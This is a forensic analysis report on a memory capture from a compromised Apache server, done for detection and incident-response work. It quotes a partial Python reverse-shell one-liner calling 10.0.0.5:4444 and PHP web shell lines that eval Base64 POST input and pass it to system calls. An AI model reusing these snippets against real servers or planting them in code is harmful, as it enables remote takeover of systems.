# Forensic Analysis Report: Operation Ironclad
**Date:** June 23, 2026  
**Investigator:** Brandon Lawrence Gregg (BlueSilverX4)  
**Target Artifact:** `webshell_execution.raw` (Volatile Memory Capture)  
**Objective:** Isolate and analyze suspected web shell execution and persistent remote access vectors.

---

## 1. Executive Summary
During a targeted hunting operation, a non-allocating memory interrogation pipeline was executed against a volatile memory capture to identify unauthorized remote access mechanisms. The analysis successfully isolated an active, malicious reverse shell lifecycle spawned directly from a compromised web service daemon. 

---

## 2. Forensic Findings & Evidence

### Phase 1: Web Daemon & Process Tree Anomalies
The triage script carved active process memory structures and identified a critical parent-child process anomaly:
* **Parent Process:** `/usr/sbin/apache2 -k start` (Running under the low-privilege `www-data` service identity, PID 1420).
* **Child Process:** `/bin/sh` (PID 1422) anomaly-spawned by the web server daemon.
* **Payload Execution:** The child shell immediately invoked a standalone, inline Python socket configuration:
  `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.5",4444));...'`
* **Impact:** This structure systematically duplicates standard input/output/error descriptors to establish an interactive outbound TCP reverse shell to an external adversary node (`10.0.0.5:4444`), bypassing ingress perimeter firewall rules.

### Phase 2 & 3: Web Shell Signature Carving
Linear string extraction across the volatile data matrix recovered raw PHP web shell instructions lingering within the memory space:
* **Signature A:** `@_POST['cmd'] = eval(base64_decode($_POST['x']));`
  * *Analysis:* Indicates unauthenticated, arbitrary code execution capabilities utilizing Base64 obfuscation to evade static network signature filtering.
* **Signature B:** `passthru($_POST['bkshell']); shell_exec($cmd); system($cmd);`
  * *Analysis:* Confirms explicit system-level command execution vectors utilizing standard PHP process wrappers (`passthru`, `shell_exec`, `system`) pointing to a backdoor handle (`bkshell`).

---

## 3. Engineering Post-Mortem & Architecture Pivot
* **The Constraint:** Initial deep-dive analysis utilizing Volatility 3 triggered severe RAM exhaustion and hypervisor kernel locks on local lab nodes due to heavy Python object graph mapping.
* **The Mitigation:** Successfully pivoted to an optimized, stream-oriented triage methodology (`ironclad_triage.sh`). By leveraging pipeline processing (`strings` + sequential `grep` filtering), the memory footprint was reduced to 0% excess allocation, ensuring stable forensic processing on resource-constrained hardware.
